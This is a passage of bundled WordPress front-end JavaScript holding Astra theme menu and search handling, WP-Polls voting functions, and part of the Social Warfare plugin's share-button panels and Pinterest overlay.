          }, !astra.is_header_footer_builder_active) {
            for (var s = n.getElementsByTagName("a"), o = n.getElementsByTagName("ul"), r = 0, l = o.length; r < l; r++) o[r].parentNode.setAttribute("aria-haspopup", "true");
            for (r = 0, l = s.length; r < l; r++) s[r].addEventListener("focus", k, !0), s[r].addEventListener("blur", k, !0), s[r].addEventListener("click", L, !0);
          }
          astra.is_header_footer_builder_active && !function () {
            const t = document.querySelectorAll("nav.site-navigation .menu-item-has-children > a .ast-header-navigation-arrow"),
              a = document.querySelectorAll("nav.site-navigation .sub-menu"),
              n = document.querySelectorAll("nav.site-navigation .menu-item-has-children"),
              s = document.querySelectorAll(".astra-full-megamenu-wrapper");
            t && (t.forEach(e => {
              e.addEventListener("keydown", function (a) {
                "Enter" === a.key && (a.target.closest("li").querySelector(".sub-menu").classList.contains("astra-megamenu") ? setTimeout(() => {
                  var e = a.target.closest("li").querySelector(".sub-menu"),
                    t = a.target.closest("li").querySelector(".astra-full-megamenu-wrapper");
                  e && e.classList.toggle("astra-megamenu-focus"), t && t.classList.toggle("astra-megamenu-wrapper-focus"), a.target.closest("li").classList.toggle("ast-menu-hover"), "false" !== a.target.getAttribute("aria-expanded") && a.target.getAttribute("aria-expanded") ? a.target.setAttribute("aria-expanded", "false") : a.target.setAttribute("aria-expanded", "true");
                }, 10) : setTimeout(() => {
                  a.target.closest("li").querySelector(".sub-menu").classList.toggle("toggled-on"), a.target.closest("li").classList.toggle("ast-menu-hover"), "false" !== a.target.getAttribute("aria-expanded") && a.target.getAttribute("aria-expanded") ? a.target.setAttribute("aria-expanded", "false") : a.target.setAttribute("aria-expanded", "true");
                }, 10));
              });
            }), (a || n) && document.addEventListener("click", function (e) {
              b(a, t, n, s);
            }, !1), a || n) && document.addEventListener("keydown", function (e) {
              "Escape" === e.key && b(a, t, n, s);
            }, !1);
            var e = document.querySelectorAll("nav.site-navigation .ast-nav-menu > .menu-item-has-children > a .ast-header-navigation-arrow");
            e && e.forEach(e => {
              e.addEventListener("keydown", function (e) {
                e.target.closest("li").classList.contains("ast-menu-hover") || "Enter" !== e.key || b(a, t, n, s);
              }, !1);
            });
          }();
        }
      }
    }
  });
  for (var t, a, o, l, h = function () {
      var e = u.style.overflow,
        t = (u.style.overflow = "hidden", document.documentElement.clientWidth);
      if (u.style.overflow = e, astra.break_point < t || 0 === t) {
        if (0 < r.length) for (var a = 0; a < r.length; a++) null !== r[a] && r[a].classList.remove("toggled");
        u.classList.remove("ast-header-break-point"), u.classList.add("ast-desktop"), astraTriggerEvent(u, "astra-header-responsive-enabled");
      } else u.classList.add("ast-header-break-point"), u.classList.remove("ast-desktop"), astraTriggerEvent(u, "astra-header-responsive-disabled");
    }, v = function () {
      var e = document.querySelectorAll(".ast-account-action-login");
      if (void 0 !== e) {
        var a = document.querySelectorAll("#ast-hb-login-close"),
          n = document.querySelectorAll("#ast-hb-account-login-wrap");
        if (0 < a.length) for (let t = 0; t < e.length; t++) e[t].onclick = function (e) {
          e.preventDefault(), e.stopPropagation(), n[t].classList.contains("show") || n[t].classList.add("show");
        }, a[t].onclick = function (e) {
          e.preventDefault(), n[t].classList.remove("show");
        };
      }
    }, f = (h(), AstraToggleSubMenu = function (e) {
      e.preventDefault(), "false" !== e.target.getAttribute("aria-expanded") && e.target.getAttribute("aria-expanded") ? e.target.setAttribute("aria-expanded", "false") : e.target.setAttribute("aria-expanded", "true");
      for (var t = this.parentNode, a = (t.classList.contains("ast-submenu-expanded") && document.querySelector("header.site-header").classList.contains("ast-builder-menu-toggle-link") && (this.classList.contains("ast-menu-toggle") || "" !== (e = t.querySelector("a").getAttribute("href")) && "#" !== e && (window.location = e)), t.querySelectorAll(".menu-item-has-children")), n = 0; n < a.length; n++) {
        a[n].classList.remove("ast-submenu-expanded");
        var s = a[n].querySelector(".sub-menu, .children");
        null !== s && (s.style.display = "none");
      }
      for (var o = t.parentNode.querySelectorAll(".menu-item-has-children"), n = 0; n < o.length; n++) if (o[n] != t) {
        o[n].classList.remove("ast-submenu-expanded");
        for (var r = o[n].querySelectorAll(".sub-menu"), l = 0; l < r.length; l++) r[l].style.display = "none";
      }
      t.classList.contains("menu-item-has-children") && (astraToggleClass(t, "ast-submenu-expanded"), t.classList.contains("ast-submenu-expanded") ? t.querySelector(".sub-menu").style.display = "block" : t.querySelector(".sub-menu").style.display = "none");
    }, AstraToggleSetup = function () {
      if ("undefined" != typeof astraAddon && "function" == typeof astraToggleSetupPro) astraToggleSetupPro(d, u, i);else {
        var e,
          t,
          a,
          n = !1;
        if (0 < (e = "off-canvas" === d || "full-width" === d ? (t = document.querySelectorAll("#ast-mobile-popup, #ast-mobile-header"), (a = document.querySelectorAll("#ast-mobile-header .main-header-menu-toggle")).length) : (t = document.querySelectorAll("#ast-mobile-header"), (n = !(0 < (e = (a = document.querySelectorAll("#ast-mobile-header .main-header-menu-toggle")).length))) ? 1 : e)) || n) for (var s = 0; s < e; s++) if (n || (a[s].setAttribute("data-index", s), i[s]) || (i[s] = a[s], a[s].addEventListener("click", astraNavMenuToggle, !1)), void 0 !== t[s]) for (var o, r = 0; r < t.length; r++) if (0 < (o = document.querySelector("header.site-header").classList.contains("ast-builder-menu-toggle-link") ? t[r].querySelectorAll("ul.main-header-menu .menu-item-has-children > .menu-link, ul.main-header-menu .ast-menu-toggle") : t[r].querySelectorAll("ul.main-header-menu .ast-menu-toggle")).length) for (var l = 0; l < o.length; l++) o[l].addEventListener("click", AstraToggleSubMenu, !1);
      }
    }, astraNavMenuToggle = function (e) {
      if ("undefined" != typeof astraAddon) astraNavMenuTogglePro(e, u, d, this);else {
        e.preventDefault();
        var e = document.querySelectorAll("#masthead > #ast-mobile-header .main-header-bar-navigation"),
          t = (r = document.querySelectorAll("#masthead > #ast-mobile-header .main-header-menu-toggle"), "0");
        if (null !== this.closest("#ast-fixed-header") && (e = document.querySelectorAll("#ast-fixed-header > #ast-mobile-header .main-header-bar-navigation"), r = document.querySelectorAll("#ast-fixed-header .main-header-menu-toggle"), t = "0"), void 0 === e[t]) return !1;
        for (var a = e[t].querySelectorAll(".menu-item-has-children"), n = 0; n < a.length; n++) {
          a[n].classList.remove("ast-submenu-expanded");
          for (var s = a[n].querySelectorAll(".sub-menu"), o = 0; o < s.length; o++) s[o].style.display = "none";
        }
        -1 !== (this.getAttribute("class") || "").indexOf("main-header-menu-toggle") && (astraToggleClass(e[t], "toggle-on"), astraToggleClass(r[t], "toggled"), e[t].classList.contains("toggle-on") ? (e[t].style.display = "block", u.classList.add("ast-main-header-nav-open")) : (e[t].style.display = "", u.classList.remove("ast-main-header-nav-open")));
      }
    }, u.addEventListener("astra-header-responsive-enabled", function () {
      var e = document.querySelectorAll(".main-header-bar-navigation");
      if (0 < e.length) for (var t = 0; t < e.length; t++) {
        null != e[t] && (e[t].classList.remove("toggle-on"), e[t].style.display = "");
        for (var a = e[t].getElementsByClassName("sub-menu"), n = 0; n < a.length; n++) a[n].style.display = "";
        for (var s = e[t].getElementsByClassName("children"), o = 0; o < s.length; o++) s[o].style.display = "";
        for (var r = e[t].getElementsByClassName("ast-search-menu-icon"), l = 0; l < r.length; l++) r[l].classList.remove("ast-dropdown-active"), r[l].style.display = "";
      }
    }, !1), E = navigator.userAgent, a = E.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [], /trident/i.test(a[1]) ? t = /\brv[ :]+(\d+)/g.exec(E) || [] : "Chrome" === a[1] && null != (t = E.match(/\bOPR|Edge\/(\d+)/)) || (a = a[2] ? [a[1], a[2]] : [navigator.appName, navigator.appVersion, "-?"], null != (t = E.match(/version\/(\d+)/i)) && a.splice(1, 1, t[1]), "Safari" === a[0] && a[1] < 11 && document.body.classList.add("ast-safari-browser-less-than-11")), document.getElementsByClassName("astra-search-icon")), y = 0; y < f.length; y++) f[y].onclick = function (e) {
    var t;
    this.classList.contains("slide-search") && (e.preventDefault(), (t = this.parentNode.parentNode.parentNode.querySelector(".ast-search-menu-icon")).classList.contains("ast-dropdown-active") ? ("" !== (t.querySelector(".search-field").value || "") && t.querySelector(".search-form").submit(), t.classList.remove("ast-dropdown-active")) : (t.classList.add("ast-dropdown-active"), t.querySelector(".search-field").setAttribute("autocomplete", "off"), setTimeout(function () {
      t.querySelector(".search-field").focus();
    }, 200)));
  };
  function b(e, t, a, n) {
    e && e.forEach(e => {
      e.classList.remove("astra-megamenu-focus"), e.classList.remove("toggled-on");
    }), a && a.forEach(e => {
      e.classList.remove("ast-menu-hover");
    }), n && n.forEach(e => {
      e.classList.remove("astra-megamenu-wrapper-focus");
    }), t && t.forEach(e => {
      e.setAttribute("aria-expanded", "false");
    });
  }
  function L() {
    var e = this || "";
    if (e && !e.classList.contains("astra-search-icon") && null === e.closest(".ast-builder-menu") && -1 !== new String(e).indexOf("#")) {
      var t = e.parentNode;
      if (u.classList.contains("ast-header-break-point")) document.querySelector("header.site-header").classList.contains("ast-builder-menu-toggle-link") && t.classList.contains("menu-item-has-children") || (document.querySelector(".main-header-menu-toggle").classList.remove("toggled"), (t = document.querySelector(".main-header-bar-navigation")).classList.remove("toggle-on"), t.style.display = "none", astraTriggerEvent(document.querySelector("body"), "astraMenuHashLinkClicked"));else for (; -1 === e.className.indexOf("nav-menu");) "li" === e.tagName.toLowerCase() && -1 !== e.className.indexOf("focus") && (e.className = e.className.replace(" focus", "")), e = e.parentElement;
    }
  }
  function k() {
    for (var e = this; -1 === e.className.indexOf("navigation-accessibility");) "li" === e.tagName.toLowerCase() && e.classList.toggle("focus"), e = e.parentElement;
  }
  if (document.querySelectorAll(".search-field").forEach(e => {
    e.addEventListener("focus", function (e) {
      var t = this.parentNode.parentNode.parentNode.querySelector(".ast-search-menu-icon");
      t && astraToggleClass(t, "ast-dropdown-active");
    }), e.addEventListener("blur", function (e) {
      var t = this.parentNode.parentNode.parentNode.querySelector(".ast-search-menu-icon");
      t && (t.classList.remove("ast-dropdown-active"), astraToggleClass(t, "ast-dropdown-active"));
    });
  }), u.onclick = function (e) {
    if (void 0 !== e.target.classList && !e.target.classList.contains("ast-search-menu-icon") && 0 === astraGetParents(e.target, ".ast-search-menu-icon").length && 0 === astraGetParents(e.target, ".ast-search-icon").length) for (var t = document.getElementsByClassName("ast-search-menu-icon"), a = 0; a < t.length; a++) t[a].classList.remove("ast-dropdown-active");
  }, astra.is_header_footer_builder_active || "querySelector" in document && "addEventListener" in window && (u.addEventListener("mousedown", function () {
    u.classList.add("ast-mouse-clicked");
  }), u.addEventListener("keydown", function () {
    u.classList.remove("ast-mouse-clicked");
  })), astra.is_scroll_to_id) {
    var E = document.querySelectorAll('a[href*="#"]:not([href="#"]):not([href="#0"]):not([href*="uagb-tab"]):not(.uagb-toc-link__trigger):not(.skip-link)');
    if (E) for (const link of E) "" !== link.hash && link.addEventListener("click", S);
    function S(e) {
      let t = 0;
      var a = document.querySelector(".site-header");
      a && ((a = a.querySelectorAll("div[data-stick-support]")) && a.forEach(e => {
        t += e.clientHeight;
      }), a = this.hash) && (a = document.querySelector(a)) && (a = a.offsetTop - t) && astraSmoothScroll(e, a);
    }
  }
  astra.is_scroll_to_top && (o = document.querySelector("#page header"), l = document.getElementById("ast-scroll-top"), astScrollToTopHandler(o, l), window.addEventListener("scroll", function () {
    astScrollToTopHandler(o, l);
  }), l.onclick = function (e) {
    astraSmoothScroll(e, 0);
  }, l.addEventListener("keydown", function (e) {
    "Enter" === e.key && astraSmoothScroll(e, 0);
  }));
}();
function poll_vote(l) {
  jQuery(document).ready(function (o) {
    poll_answer_id = "", poll_multiple_ans = 0, poll_multiple_ans_count = 0, o("#poll_multiple_ans_" + l).length && (poll_multiple_ans = parseInt(o("#poll_multiple_ans_" + l).val())), o("#polls_form_" + l + " input:checkbox, #polls_form_" + l + " input:radio, #polls_form_" + l + " option").each(function (l) {
      (o(this).is(":checked") || o(this).is(":selected")) && (poll_multiple_ans > 0 ? (poll_answer_id = o(this).val() + "," + poll_answer_id, poll_multiple_ans_count++) : poll_answer_id = parseInt(o(this).val()));
    }), poll_multiple_ans > 0 ? poll_multiple_ans_count > 0 && poll_multiple_ans_count <= poll_multiple_ans ? (poll_answer_id = poll_answer_id.substring(0, poll_answer_id.length - 1), poll_process(l, poll_answer_id)) : 0 == poll_multiple_ans_count ? alert(pollsL10n.text_valid) : alert(pollsL10n.text_multiple + " " + poll_multiple_ans) : poll_answer_id > 0 ? poll_process(l, poll_answer_id) : alert(pollsL10n.text_valid);
  });
}
function poll_process(l, o) {
  jQuery(document).ready(function (s) {
    poll_nonce = s("#poll_" + l + "_nonce").val(), pollsL10n.show_fading ? (s("#polls-" + l).fadeTo("def", 0), pollsL10n.show_loading && s("#polls-" + l + "-loading").show(), s.ajax({
      type: "POST",
      xhrFields: {
        withCredentials: !0
      },
      url: pollsL10n.ajax_url,
      data: "action=polls&view=process&poll_id=" + l + "&poll_" + l + "=" + o + "&poll_" + l + "_nonce=" + poll_nonce,
      cache: !1,
      success: poll_process_success(l)
    })) : (pollsL10n.show_loading && s("#polls-" + l + "-loading").show(), s.ajax({
      type: "POST",
      xhrFields: {
        withCredentials: !0
      },
      url: pollsL10n.ajax_url,
      data: "action=polls&view=process&poll_id=" + l + "&poll_" + l + "=" + o + "&poll_" + l + "_nonce=" + poll_nonce,
      cache: !1,
      success: poll_process_success(l)
    }));
  });
}
function poll_result(l) {
  jQuery(document).ready(function (o) {
    poll_nonce = o("#poll_" + l + "_nonce").val(), pollsL10n.show_fading ? (o("#polls-" + l).fadeTo("def", 0), pollsL10n.show_loading && o("#polls-" + l + "-loading").show(), o.ajax({
      type: "POST",
      xhrFields: {
        withCredentials: !0
      },
      url: pollsL10n.ajax_url,
      data: "action=polls&view=result&poll_id=" + l + "&poll_" + l + "_nonce=" + poll_nonce,
      cache: !1,
      success: poll_process_success(l)
    })) : (pollsL10n.show_loading && o("#polls-" + l + "-loading").show(), o.ajax({
      type: "POST",
      xhrFields: {
        withCredentials: !0
      },
      url: pollsL10n.ajax_url,
      data: "action=polls&view=result&poll_id=" + l + "&poll_" + l + "_nonce=" + poll_nonce,
      cache: !1,
      success: poll_process_success(l)
    }));
  });
}
function poll_booth(l) {
  jQuery(document).ready(function (o) {
    poll_nonce = o("#poll_" + l + "_nonce").val(), pollsL10n.show_fading ? (o("#polls-" + l).fadeTo("def", 0), pollsL10n.show_loading && o("#polls-" + l + "-loading").show(), o.ajax({
      type: "POST",
      xhrFields: {
        withCredentials: !0
      },
      url: pollsL10n.ajax_url,
      data: "action=polls&view=booth&poll_id=" + l + "&poll_" + l + "_nonce=" + poll_nonce,
      cache: !1,
      success: poll_process_success(l)
    })) : (pollsL10n.show_loading && o("#polls-" + l + "-loading").show(), o.ajax({
      type: "POST",
      xhrFields: {
        withCredentials: !0
      },
      url: pollsL10n.ajax_url,
      data: "action=polls&view=booth&poll_id=" + l + "&poll_" + l + "_nonce=" + poll_nonce,
      cache: !1,
      success: poll_process_success(l)
    }));
  });
}
function poll_process_success(l) {
  return function (o) {
    jQuery(document).ready(function (s) {
      s("#polls-" + l).replaceWith(o), pollsL10n.show_loading && s("#polls-" + l + "-loading").hide(), pollsL10n.show_fading && s("#polls-" + l).fadeTo("def", 1);
    });
  };
}
pollsL10n.show_loading = parseInt(pollsL10n.show_loading), pollsL10n.show_fading = parseInt(pollsL10n.show_fading);
window.socialWarfare = window.socialWarfare || {};
(function (window, $) {
  "use strict";

  if (typeof $ != "function") {
    if (typeof jQuery == "function") {
      var $ = jQuery;
    } else {
      console.log("Social Warfare requires jQuery, or $ as an alias of jQuery. Please make sure your theme provides access to jQuery before activating Social Warfare.");
      return;
    }
  }
  function isString(maybeString) {
    return typeof maybeString == "string" && maybeString.length > 0;
  }
  socialWarfare.paddingTop = parseInt($("body").css("padding-top"));
  socialWarfare.paddingBottom = parseInt($("body").css("padding-bottom"));
  socialWarfare.initPlugin = function () {
    $("body").css({
      paddingTop: socialWarfare.paddingTop,
      paddingBottom: socialWarfare.paddingBottom
    });
    socialWarfare.establishPanels();
    socialWarfare.establishBreakpoint();
    if (!socialWarfare.panels.staticHorizontal && !socialWarfare.panels.floatingSide && !socialWarfare.panels.floatingHorizontal) {
      return;
    }
    socialWarfare.emphasizeButtons();
    socialWarfare.createFloatHorizontalPanel();
    socialWarfare.positionFloatSidePanel();
    socialWarfare.activateHoverStates();
    socialWarfare.handleButtonClicks();
    socialWarfare.updateFloatingButtons();
    socialWarfare.closeLightboxOverlay();
    socialWarfare.preloadPinterestImages();
    if (typeof swpPinIt == "object" && swpPinIt.enabled == !0) {
      socialWarfare.createHoverSaveButton();
      socialWarfare.triggerImageListeners();
    }
    setTimeout(function () {
      socialWarfare.checkListeners(0, 5);
    }, 2e3);
    var time = Date.now();
    var scrollDelay = 50;
    $(window).on("scroll", function () {
      if (time + scrollDelay - Date.now() < 0) {
        socialWarfare.updateFloatingButtons();
        time = Date.now();
      }
    });
  };
  var resizeWait;
  socialWarfare.onWindowResize = function () {
    clearTimeout(resizeWait);
    resizeWait = setTimeout(socialWarfare.initPlugin, 100);
  };
  socialWarfare.establishPanels = function () {
    socialWarfare.panels = {
      staticHorizontal: null,
      floatingSide: null,
      floatingHorizontal: null
    };
    socialWarfare.panels.staticHorizontal = $(".swp_social_panel").not(".swp_social_panelSide");
    socialWarfare.panels.floatingSide = $(".swp_social_panelSide");
    return socialWarfare.panels;
  };
  socialWarfare.emphasizeButtons = function () {
    if (typeof socialWarfare.variables.emphasizeIcons == "undefined") {
      return;
    }
    if (socialWarfare.isMobile()) {
      return;
    }
    jQuery(".swp_social_panel:not(.swp_social_panelSide)").each(function (i, panel) {
      jQuery(panel).find(".nc_tweetContainer:not(.total_shares)").each(function (index, button) {
        if (index < socialWarfare.variables.emphasizeIcons) {
          var shareWidth = jQuery(button).find(".swp_share").width();
          var iconWidth = jQuery(button).find("i.sw").outerWidth();
          var iconTextWidth = shareWidth + iconWidth + 35;
          var containerWidth = jQuery(button).width();
          var change = 1 + (shareWidth + 35) / containerWidth;
          if (change < 2) {
            jQuery(button).addClass("swp_nohover").css({
              flex: "2 1 0%"
            }).find(".iconFiller").width(iconTextWidth);
          } else {
            jQuery(button).addClass("swp_nohover").css({
              flex: change + " 1 0%"
            }).find(".iconFiller").width(iconTextWidth);
          }
        }
      });
    });
  };
  socialWarfare.activateHoverStates = function () {
    socialWarfare.trigger("pre_activate_buttons");
    $(".swp_social_panel:not(.swp_social_panelSide) .nc_tweetContainer").on("mouseenter", function () {
      if ($(this).hasClass("swp_nohover")) {
        return;
      }
      socialWarfare.resetStaticPanel();
      var termWidth = $(this).find(".swp_share").outerWidth();
      var iconWidth = $(this).find("i.sw").outerWidth();
      var containerWidth = $(this).width();
      var change = 1 + (termWidth + 35) / containerWidth;
      $(this).find(".iconFiller").width(termWidth + iconWidth + 25 + "px");
      $(this).css("flex", change + " 1 0%");
    });
    $(".swp_social_panel:not(.swp_social_panelSide)").on("mouseleave", socialWarfare.resetStaticPanel);
  };
  socialWarfare.resetStaticPanel = function () {
    $(".swp_social_panel:not(.swp_social_panelSide) .nc_tweetContainer:not(.swp_nohover) .iconFiller").removeAttr("style");
    $(".swp_social_panel:not(.swp_social_panelSide) .nc_tweetContainer:not(.swp_nohover)").removeAttr("style");
  };
  socialWarfare.handleButtonClicks = function () {
    $(".nc_tweet, a.swp_CTT").off("click");
    $(".nc_tweet, a.swp_CTT").on("click", function (event) {
      if ($(this).parent(".swp_print").length > 0) {
        event.preventDefault();
        window.print();
        return;
      }
      if (!0 === $(this).hasClass("pinterest_multi_image_select")) {
        event.preventDefault();
        socialWarfare.openMultiPinterestOverlay($(this));
        return;
      }
      if ($(this).parent(".swp_more").length > 0) {
        event.preventDefault();
        socialWarfare.openMoreOptions($(this));
        return;
      }
      if ($(this).hasClass("noPop")) {
        return event;
      }
      if ("undefined" == typeof $(this).data("link") && !1 === $(this).is(".swp-hover-pin-button")) {
        return event;
      }
      event.preventDefault();
      var href = $(this).data("link").replace("’", "'");
      var height, width, top, left, instance, windowAttributes, network;
      height = 270;
      width = 500;
      if ($(this).is(".swp_pinterest a, .buffer_link a, .flipboard a, .swp-hover-pin-button")) {
        height = 550;
        width = 775;
      }
      if ($(this).hasClass("nc_tweet")) {
        network = $(this).parents(".nc_tweetContainer").data("network");
      } else if ($(this).hasClass("swp_CTT")) {
        network = "ctt";
      }
      top = window.screenY + (window.innerHeight - height) / 2;
      left = window.screenX + (window.innerWidth - width) / 2;
      windowAttributes = "height=" + height + ",width=" + width + ",top=" + top + ",left=" + left;
      instance = window.open(href, network, windowAttributes);
      socialWarfare.trackClick(network);
    });
  };
  socialWarfare.openMultiPinterestOverlay = function (element) {
    if ($(".pinterest-overlay").length > 0) {
      $(".pinterest-overlay").fadeIn();
      $(".swp-lightbox-inner").scrollTop(0);
      return;
    }
    var html = "";
    var pin_data = element.data("pins");
    var pin_images = "";
    pin_data.images.forEach(function (image) {
      var share_url = "https://pinterest.com/pin/create/button/?url=" + pin_data.url + "&media=" + image + "&description=" + encodeURIComponent(pin_data.description);
      var pin_html = "";
      pin_html += '<div class="pin_image_select_wrapper">';
      pin_html += '<img class="pin_image" src="' + image + '" />';
      pin_html += '<a class="swp-hover-pin-button" href="' + share_url + '" data-link="' + share_url + '">Save</a>';
      pin_html += "</div>";
      pin_images += pin_html;
    });
    html += '<div class="swp-lightbox-wrapper pinterest-overlay"><div class="swp-lightbox-inner">';
    html += '<i class="sw swp_pinterest_icon top_icon"></i>';
    html += '<div class="swp-lightbox-close"></div>';
    html += "<h5>Which image would you like to pin?</h5>";
    html += '<div class="pin_images_wrapper">';
    html += pin_images;
    html += "</div>";
    html += socialWarfare.buildPoweredByLink();
    html += "</div></div>";
    $("body").append(html);
    $(".pinterest-overlay").hide().fadeIn();
    socialWarfare.handleButtonClicks();
    var max_height = 999999;
    var iteration = 0,
      images = $(".pinterest-overlay .pin_images_wrapper img");
    images.load(function () {
      if (++iteration === images.length) {
        images.each(function () {
          if ($(this).height() < max_height) {
            max_height = $(this).height();
          }
        }).promise().done(function () {
          images.height(max_height + "px");
          var number_of_rows = Math.ceil(images.length / 4);
          for (i = 0; i < number_of_rows; i++) {
            var current_row_images = images.slice(i * 4, i * 4 + 4);
            var max_allowable_width = current_row_images.length / 4;
            var total_width = $(".pin_images_wrapper").width();
            var total_images_width = 0;
            current_row_images.each(function () {
              total_images_width = total_images_width + $(this).width();
            });
            var ratio = total_width / total_images_width;
            current_row_images.each(function () {
              var new_width = $(this).width() * ratio / total_width * 100 * max_allowable_width - 1;
              $(this).parent().width(new_width + "%");
              $(this).height("auto");
            });
            var height = current_row_images.first().height();
            current_row_images.each(function () {
              $(this).width($(this).width()).height(height);
            });
          }
        });
      }
    });
  };
  socialWarfare.buildPoweredByLink = function () {
    var html = "";
    if (!0 === socialWarfare.variables.powered_by_toggle) {
      var anchor_tag_open = "";
      var anchor_tag_close = "";
      if (!1 !== socialWarfare.variables.affiliate_link) {
        anchor_tag_open = '<a href="' + socialWarfare.variables.affiliate_link + '" target="_blank">';
        anchor_tag_close = "</a>";
      }
      html = '<div class="swp_powered_by">' + anchor_tag_open + '<span>Powered by</span> <img src="/wp-content/plugins/social-warfare/assets/images/admin-options-page/social-warfare-pro-light.png">' + anchor_tag_close + "</div>";
    }
    return html;
  };
  socialWarfare.preloadPinterestImages = function () {
    if ($(".pinterest_multi_image_select").length < 1) {
      return;
    }
    var pin_data = $(".pinterest_multi_image_select").data("pins");
    pin_data.images.forEach(function (image_url) {
      var image_object = new Image();
      image_object.src = image_url;
    });
  };
  socialWarfare.openMoreOptions = function (element) {
    if ($(".swp-more-wrapper").length > 0) {
      $(".swp-more-wrapper").fadeIn();
      return;
    }
    var post_id = element.parents(".swp_social_panel").data("post-id");
    var data = {
      action: "swp_buttons_panel",
      post_id: post_id,
      _ajax_nonce: swp_nonce
    };
    jQuery.post(swp_ajax_url, data, function (response) {
      $("body").append(response);
      $(".swp-lightbox-wrapper").hide().fadeIn();
      socialWarfare.activateHoverStates();
      socialWarfare.handleButtonClicks();
    });
  };
  socialWarfare.closeLightboxOverlay = function () {
    $("body").on("click", ".swp-lightbox-close", function () {
      $(".swp-lightbox-wrapper").fadeOut();
    });
    $(document).on("keyup", function (e) {
      if (e.key === "Escape") {
        $(".swp-lightbox-wrapper").fadeOut();
      }
    });
  };
  socialWarfare.createFloatHorizontalPanel = function () {
    if (!socialWarfare.panels.staticHorizontal.length) {
      return;
    }
    var floatLocation = socialWarfare.panels.staticHorizontal.data("float");
    var mobileFloatLocation = socialWarfare.panels.staticHorizontal.data("float-mobile");
    var backgroundColor = socialWarfare.panels.staticHorizontal.data("float-color");
    var wrapper = $('<div class="nc_wrapper swp_floating_horizontal_wrapper" style="background-color:' + backgroundColor + '"></div>');
    var barLocation = "";
    if ($(".nc_wrapper").length) {
      $(".nc_wrapper").remove();
    }
    if ($(".swp_floating_horizontal_wrapper").length) {
      $(".swp_floating_horizontal_wrapper").remove();
    }
    if (floatLocation != "top" && floatLocation != "bottom" && mobileFloatLocation != "top" && mobileFloatLocation != "bottom") {
      return;
    }
    if (socialWarfare.isMobile()) {
      barLocation = mobileFloatLocation;
    } else {
      barLocation = floatLocation;
    }
    wrapper.addClass(barLocation).hide().appendTo("body");
    socialWarfare.panels.floatingHorizontal = socialWarfare.panels.staticHorizontal.first().clone();
    socialWarfare.panels.floatingHorizontal.addClass("nc_floater").appendTo(wrapper);
    socialWarfare.updateFloatingHorizontalDimensions();
    $(".swp_social_panel .swp_count").css({
      transition: "padding .1s linear"
    });
  };
  socialWarfare.updateFloatingHorizontalDimensions = function () {
    if (!socialWarfare.panels.staticHorizontal.length) {
      return;
    }
    if (!socialWarfare.panels.floatingHorizontal) {
      return;
    }
    var width = "100%";
    var left = 0;
    var panel = socialWarfare.panels.staticHorizontal;
    var parent = panel.parent();
    if (parent.hasClass("swp-hidden-panel-wrap")) {
      parent = parent.parent();
    }
    if ("undefined" !== typeof panel.offset().left) {
      left = panel.offset().left;
    }
    if ("undefined" !== typeof panel.width()) {
      width = panel.width();
    }
    if (left == 0) {
      left = parent.offset().left;
    }
    if (width == 100 || width == 0) {
      width = parent.width();
    }
    socialWarfare.panels.floatingHorizontal.css({
      width: width,
      left: left
    });
  };
  socialWarfare.staticPanelIsVisible = function () {
    var visible = !1;
    var scrollPos = $(window).scrollTop();
    $(".swp_social_panel").not(".swp_social_panelSide, .nc_floater").each(function (index) {
      var offset = $(this).offset();
      if (typeof socialWarfare.floatBeforeContent != "undefined" && "1" != socialWarfare.floatBeforeContent) {
        var theContent = $(".swp-content-locator").parent();
        if (index === 0 && theContent.length && theContent.offset().top > scrollPos + $(window).height()) {
          visible = !0;
        }
      }
      if ($(this).is(":visible") && offset.top + $(this).height() > scrollPos && offset.top < scrollPos + $(window).height()) {
        visible = !0;
      }
    });
    return visible;
  };
  socialWarfare.updateFloatingButtons = function () {
    if (socialWarfare.panels.staticHorizontal.length) {
      var panel = socialWarfare.panels.staticHorizontal;
    } else if (socialWarfare.panels.floatingSide.length) {
      var panel = socialWarfare.panels.floatingSide;
    } else {
      return;
    }
    var location = panel.data("float");
    if (!0 == socialWarfare.isMobile()) {
      var location = panel.data("float-mobile");
    }
    if (location == "none") {
      return $(".nc_wrapper, .swp_floating_horizontal_wrapper, .swp_social_panelSide").hide();
    }
    if (socialWarfare.isMobile()) {
      socialWarfare.toggleMobileButtons();
      socialWarfare.toggleFloatingHorizontalPanel();
      return;
    }
    if (location == "right" || location == "left") {
      socialWarfare.toggleFloatingVerticalPanel();
    }
    if (location == "bottom" || location == "top") {
      socialWarfare.toggleFloatingHorizontalPanel();
    }
  };
  socialWarfare.toggleMobileButtons = function () {
    socialWarfare.panels.floatingSide.hide();
    var visibility = socialWarfare.staticPanelIsVisible() ? "collapse" : "visible";
    $(".nc_wrapper, .swp_floating_horizontal_wrapper").css("visibility", visibility);
  };
  socialWarfare.toggleFloatingVerticalPanel = function () {
    var direction = "";
    var location = socialWarfare.panels.floatingSide.data("float");
    var visible = socialWarfare.staticPanelIsVisible();
    var offset = "";
    if (socialWarfare.isMobile()) {
      return socialWarfare.panels.floatingSide.hide();
    }
    if (!socialWarfare.panels.floatingSide || !socialWarfare.panels.floatingSide.length) {
      visible = !0;
    }
    if (socialWarfare.panels.floatingSide.data("transition") == "slide") {
      direction = location;
      offset = visible ? "-150px" : "5px";
      socialWarfare.panels.floatingSide.css(direction, offset).show();
    } else {
      if (visible) {
        socialWarfare.panels.floatingSide.css("opacity", 1).fadeOut(300).css("opacity", 0);
      } else {
        socialWarfare.panels.floatingSide.css("opacity", 0).fadeIn(300).css("display", "flex").css("opacity", 1);
      }
    }
  };
  socialWarfare.hasReferencePanel = function () {
    return typeof socialWarfare.panels.staticHorizontal != "undefined" && socialWarfare.panels.staticHorizontal.length > 0;
  };
  socialWarfare.toggleFloatingHorizontalPanel = function () {
    if (!socialWarfare.hasReferencePanel()) {
      return;
    }
    if (!socialWarfare.panels.floatingHorizontal) {
      return;
    }
    var panel = socialWarfare.panels.floatingHorizontal.first();
    var location = socialWarfare.isMobile() ? $(panel).data("float-mobile") : $(panel).data("float");
    var newPadding = location == "bottom" ? socialWarfare.paddingBottom : socialWarfare.paddingTop;
    var paddingProp = "padding-" + location;
    if (location == "off") {
      return;
    }
    if (socialWarfare.staticPanelIsVisible()) {
      $(".nc_wrapper, .swp_floating_horizontal_wrapper").hide();
      if (socialWarfare.isMobile() && $("#wpadminbar").length) {
        $("#wpadminbar").css("top", 0);
      }
    } else {
      newPadding += 50;
      $(".nc_wrapper, .swp_floating_horizontal_wrapper").show();
      if (socialWarfare.isMobile() && location == "top" && $("#wpadminbar").length) {
        $("#wpadminbar").css("top", panel.parent().height());
      }
    }
